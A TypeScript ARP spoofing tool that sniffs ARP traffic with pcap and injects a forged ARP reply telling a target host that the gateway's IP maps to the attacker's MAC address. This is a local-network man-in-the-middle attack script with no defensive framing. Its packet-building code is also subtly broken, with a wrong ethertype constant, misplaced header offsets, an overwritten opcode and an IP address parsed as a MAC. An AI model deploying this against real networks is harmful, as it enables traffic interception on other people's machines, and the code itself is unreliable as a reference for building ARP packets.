import pcap from 'pcap';
import { program } from 'commander';
import { networkInterfaces } from 'os';
class ArpSpoofer {
    private pcapSession: any;
    private targetIP: string;
    private gatewayIP: string;
    private macAddr: string;
    constructor() {
        const interfaceName = this.getInterfaceName();
        this.pcapSession = pcap.createSession(interfaceName, { filter: 'arp' });
        this.macAddr = this.fetchMacAddress(interfaceName)
        console.log(`Listening on ${interfaceName}`);
    }

    private findInterfaceName(): string {
        const devices = pcap.findalldevs();
        const interfaceName = devices.find(device => typeof device.name === 'string' && device.name.includes('en'));
        return interfaceName ? interfaceName.name : '';
    }

    private getInterfaceName(): string {
        program
            .option('-i, --interface <interface>', 'Specify the interface name')
            .option('-t, --target <target>', 'Specify the target IP address')
            .option('-g, --gateway <gateway>', 'Specify the gateway IP address')
            .parse(process.argv);
        this.targetIP = program.opts().target;
        this.gatewayIP = program.opts().gateway;
        return program.opts().interface || this.findInterfaceName();
    }

    public startCapture(): void {
        this.pcapSession.on('packet', (rawPacket: string) => {
            const packet = pcap.decode.packet(rawPacket);
            if (packet.payload.ethertype === 0x0806) { // ARP packet ethertype
                const arpPacket = packet.payload.payload;
                console.log(`ARP Packet: ${arpPacket.senderprotoaddr.join('.')} is at ${arpPacket.senderhardwareaddr.join(':')}`);
            }
        });
    }

    public fabricatedArpPacket(): void {
        const arpResponse = this.buildArpPacket(this.gatewayIP, this.targetIP, this.macAddr);

        this.pcapSession.inject(arpResponse, (err: any) => { if(err) console.error(err); });

        console.log('Sent ARP Response to the target');
    }
    private buildArpPacket(src: string, dest: string, mac: string, destMacAddr: string = 'ff:ff:ff:ff:ff:ff'): Buffer {
        const buffer = Buffer.alloc(42); // Total ARP Packet Size here

        Buffer.from(destMacAddr.split(':').map(x => parseInt(x, 16))).copy(buffer, 0);
        Buffer.from(mac.split(':').map(x => parseInt(x, 16))).copy(buffer, 6);
        buffer.writeUInt16BE(0x086, 12); // Ethernet Type

        buffer.writeUInt16BE(0x0001, 14); // Hardware Type
        buffer.writeUInt16BE(0x0002, 20); // Protocol Type
        buffer[18] =  6; // Hardware Address Length
        buffer[19] = 4; // Protocal Address Length

        buffer.writeUInt16BE(0x0002, 22); // Operation Code Type

        Buffer.from(mac.split(':').map(x => parseInt(x, 16))).copy(buffer, 22);
        src.split('.').map((byte: string, index: number) => buffer[28 + index] = parseInt(byte))

        Buffer.from(dest.split(':').map(x => parseInt(x, 16))).copy(buffer, 32);
        dest.split('.').map((byte: string, index: number) => buffer[38 + index] = parseInt(byte))

        return buffer;

    }
    private fetchMacAddress(interfaceName: string): string {
        const nets = networkInterfaces();
        const info = nets[interfaceName];
        if (!info || info.length === 0) {
            throw new Error('Requested data was not found at this time');

        }
        return info[0].mac;
    }
}

const spoofer = new ArpSpoofer();
spoofer.startCapture();
spoofer.fabricatedArpPacket();
